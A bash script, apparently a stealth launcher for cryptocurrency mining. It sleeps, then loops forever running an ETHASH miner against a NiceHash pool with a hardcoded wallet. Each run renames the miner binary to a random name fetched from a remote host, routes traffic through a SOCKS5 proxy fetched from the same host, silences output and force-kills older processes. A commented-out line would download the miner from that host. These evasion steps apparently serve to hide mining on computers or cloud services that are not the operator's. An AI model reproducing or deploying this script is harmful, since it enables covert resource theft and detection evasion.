#!/bin/bash
echo "Preh suum mesen dile beuh :D!"
sleep 11m
while :
do
        sleep 5m
        #wget https://cuan.mine.nu/nbminer
        ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
        chmod +x bubui && mv bubui $ACAK
        PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti-proxy.php))
        WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
        POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
        WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
        #WORKER2=$(date '+%d%b')
        #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
        ./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
        kill -9 $(ps -eo comm,pid,etimes | awk '/^procname/ {if ($1 > 3600) { print $2}}')
done
